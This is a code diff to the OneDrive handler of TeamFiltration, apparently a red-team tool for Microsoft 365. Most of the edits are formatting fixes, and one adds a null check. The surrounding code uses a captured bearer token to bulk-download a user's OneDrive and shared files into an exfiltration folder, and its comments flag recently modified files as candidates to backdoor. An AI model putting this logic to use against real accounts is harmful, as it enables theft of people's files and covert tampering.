@@ -67,7 +67,7 @@ namespace TeamFiltration.Handlers
 
 
             _oneDriveClient = new HttpClient();
-            _oneDriveClient.DefaultRequestHeaders.Add("Authorization", $"Bearer { _oneDrive.AccessToken.AccessToken}");
+            _oneDriveClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {_oneDrive.AccessToken.AccessToken}");
 
 
             if (_oneDrive.headerListObject != null)
@@ -112,7 +112,7 @@ namespace TeamFiltration.Handlers
                          }
                          catch (Exception ex)
                          {
-                             _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump file => { ex.Message}"));
+                             _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump file => {ex.Message}"));
 
                          }
                      },
@@ -193,7 +193,7 @@ namespace TeamFiltration.Handlers
                     driveItemDict.Add(index, driveItem);
 
                     //LastModified is interesting for finding a file to backdoor
-                    Console.WriteLine($"    {index}".PadRight(6) + $"{ itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
+                    Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
                     index++;
                 }
                 Console.WriteLine();
@@ -302,7 +302,7 @@ namespace TeamFiltration.Handlers
                 var itemType = (childItem.File != null) ? "File" : "Folder";
                 fileDict.Add(index, childItem);
 
-                Console.WriteLine($"    {index}".PadRight(6) + $"{ itemType.PadRight(6)} => {childItem.Name.PadRight(padValue)} LastModified: {childItem.LastModifiedDateTime.DateTime}   Path: {childItem.ParentReference.Path}");
+                Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {childItem.Name.PadRight(padValue)} LastModified: {childItem.LastModifiedDateTime.DateTime}   Path: {childItem.ParentReference.Path}");
                 index++;
             }
             await InteractiveMenu(folderId, fileDict);
@@ -339,7 +339,7 @@ namespace TeamFiltration.Handlers
 
 
                 //LastModified is interesting for finding a file to backdoor
-                Console.WriteLine($"    {index}".PadRight(6) + $"{ itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
+                Console.WriteLine($"    {index}".PadRight(6) + $"{itemType.PadRight(6)} => {driveItem.Name.PadRight(padValue)} LastModified: {driveItem.LastModifiedDateTime.DateTime}  Path: {driveItem.ParentReference.Path}");
                 index++;
             }
 
@@ -360,21 +360,22 @@ namespace TeamFiltration.Handlers
                 try
                 {
                     var userSharedItems = await _oneDrive.GetSharedWithMe();
-                    foreach (var sharedItem in userSharedItems.Collection)
-                    {
-                        if (sharedItem.Folder == null)
+                    if (userSharedItems != null)
+                        foreach (var sharedItem in userSharedItems.Collection)
                         {
+                            if (sharedItem.Folder == null)
+                            {
 
-                            var tempName = Path.Combine(fullPath, sharedItem.Name);
-                            var file = await _oneDrive.DownloadItemAndSaveAs(sharedItem, tempName);
+                                var tempName = Path.Combine(fullPath, sharedItem.Name);
+                                var file = await _oneDrive.DownloadItemAndSaveAs(sharedItem, tempName);
+                            }
+                            else
+                            {
+                                await GetShared(exfilFolder, sharedItem);
+                            }
+
+
                         }
-                        else
-                        {
-                            await GetShared(exfilFolder, sharedItem);
-                        }
-
-
-                    }
 
                 }
                 catch (Exception)
@@ -450,7 +451,7 @@ namespace TeamFiltration.Handlers
                     catch (Exception ex)
                     {
 
-                        _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump folder => { ex.Message}"));
+                        _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR failed to dump folder => {ex.Message}"));
                     }
                 },
                 maxDegreeOfParallelism: 8);
